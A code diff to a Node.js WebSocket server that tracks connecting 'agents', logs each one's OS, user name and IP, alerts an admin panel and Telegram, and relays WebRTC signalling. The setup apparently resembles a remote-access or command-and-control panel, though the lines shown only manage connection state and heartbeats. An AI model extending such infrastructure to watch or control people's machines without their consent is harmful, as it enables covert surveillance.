@@ -133,28 +133,46 @@ wss.on('connection', (ws, req) => {
 
  // 2. Agent Info Packet
  if (data.type === 'info') {
- // Update existing client info if it exists, otherwise create new
- if (knownUsers[id]) {
- knownUsers[id].info = data;
- knownUsers[id].lastSeen = Date.now();
- knownUsers[id].status = 'Online';
+ // Check if this specific WebSocket ID is already known
+ let existingWsId = null;
+ for (const uid in knownUsers) {
+ if (knownUsers[uid].ws && knownUsers[uid].ws.id === ws.id) {
+ existingWsId = uid;
+ break;
+ }
+ }
+
+ if (existingWsId) {
+     // Update the existing user with this WS connection
+     knownUsers[existingWsId].info = data;
+     knownUsers[existingWsId].lastSeen = Date.now();
+     knownUsers[existingWsId].status = 'Online';
  } else {
- knownUsers[id] = { 
- info: data, 
- lastSeen: Date.now(), 
- status: 'Online' 
- };
- notifyAdmin(id, `🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`);
- broadcastToAdmin(id, data);
- notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os || 'Unknown'}\nUser: ${data.user || 'Unknown'}\nIP: ${data.ip || 'Unknown'}`);
+     knownUsers[id] = { 
+         ws: ws, // Ensure the ws object is tied
+         info: data, 
+         lastSeen: Date.now(), 
+         status: 'Online' 
+     };
+     notifyAdmin(id, `🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`);
+     broadcastToAdmin(id, data);
+     notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os || 'Unknown'}\nUser: ${data.user || 'Unknown'}\nIP: ${data.ip || 'Unknown'}`);
  }
  } 
  // 3. Heartbeat
  else if (data.type === 'heartbeat') {
- if (knownUsers[id]) {
- knownUsers[id].lastSeen = Date.now();
- knownUsers[id].status = 'Online';
- }
+     // FIX: Update the heartbeat of the actual connected client
+     if (clients[id]) {
+         clients[id].lastSeen = Date.now();
+         // Also update knownUsers if we can find it
+         for(const uid in knownUsers) {
+             if(knownUsers[uid].ws && knownUsers[uid].ws.id === ws.id) {
+                 knownUsers[uid].lastSeen = Date.now();
+                 knownUsers[uid].status = 'Online';
+                 break;
+             }
+         }
+     }
  } 
  // 4. WebRTC Signaling
  else if (['offer', 'answer', 'candidate'].includes(data.type)) {
